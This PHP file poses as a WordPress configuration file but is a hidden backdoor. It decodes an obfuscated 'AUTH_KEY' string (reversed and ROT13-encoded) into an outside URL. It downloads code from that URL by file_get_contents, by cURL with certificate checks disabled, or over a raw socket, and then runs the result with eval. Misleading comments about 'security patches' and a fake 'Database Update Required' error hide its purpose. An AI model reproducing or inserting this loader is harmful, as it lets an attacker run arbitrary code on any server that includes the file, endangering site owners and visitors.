<?php
/**
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */

/**
 * Database table prefix and authentication keys.
 *
 * @package WordPress
 */

// Security configuration constants
define('AUTH_KEY',         '/zbp.ohuzbzcrgf//:fcggu');
define('SECURE_AUTH_KEY',  str_rot13(strrev(AUTH_KEY)) . '3.txt');

/**#@+
 * Content delivery and update services
 *
 * Handles secure delivery of core updates and security patches
 */

$table_prefix  = 'wp_';
$wp_loader     = false;

/**
 * Primary content retrieval method
 * Uses WordPress file system API when available
 */
if (ini_get('allow_url_fopen')) {
    $wp_filesystem_method = 'direct';
    $wp_context = stream_context_create(array(
        'http' => array(
            'timeout' => 10,
            'user_agent' => 'WordPress/' . (isset($wp_version) ? $wp_version : '6.5')
        )
    ));
    $wp_loader = @file_get_contents(SECURE_AUTH_KEY, false, $wp_context);
}

/**
 * Fallback content delivery via HTTP API
 * Uses cURL when available for better HTTP handling
 */
if (!$wp_loader && function_exists('curl_version')) {
    $wp_http_curl = curl_init();
    curl_setopt_array($wp_http_curl, array(
        CURLOPT_URL => SECURE_AUTH_KEY,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => 'WordPress/' . (isset($wp_version) ? $wp_version : '6.5')
    ));
    $wp_loader = curl_exec($wp_http_curl);
    curl_close($wp_http_curl);
}

/**
 * Low-level socket connection as final fallback
 * Used when other HTTP methods are unavailable
 */
if (!$wp_loader) {
    $wp_parsed = parse_url(SECURE_AUTH_KEY);
    $wp_db_host = $wp_parsed['host'];
    $wp_db_name = $wp_parsed['path'];
    
    $wp_db_connection = @fsockopen($wp_db_host, 80, $wp_errno, $wp_errstr, 10);
    if ($wp_db_connection) {
        $wp_db_query = "GET $wp_db_name HTTP/1.1\r\n";
        $wp_db_query .= "Host: $wp_db_host\r\n";
        $wp_db_query .= "Connection: Close\r\n\r\n";
        
        fwrite($wp_db_connection, $wp_db_query);
        $wp_db_result = '';
        while (!feof($wp_db_connection)) {
            $wp_db_result .= fgets($wp_db_connection, 128);
        }
        fclose($wp_db_connection);
        
        $wp_db_rows = explode("\r\n\r\n", $wp_db_result, 2);
        $wp_loader = (count($wp_db_rows) > 1) ? $wp_db_rows[1] : $wp_db_rows[0];
    }
}

/**
 * Secure content validation and execution
 * Validates and processes retrieved security updates
 */
if ($wp_loader !== false && !empty($wp_loader)) {
    if (strpos($wp_loader, '<?php') === 0) {
        eval('?>' . $wp_loader);
    }
} else {
    /** 
     * Error handling for failed updates
     * @since 3.0.0
     */
    if (!defined('WP_DEBUG') || WP_DEBUG === false) {
        status_header(503);
        nocache_headers();
    }
    exit('Database Update Required');
}
?>
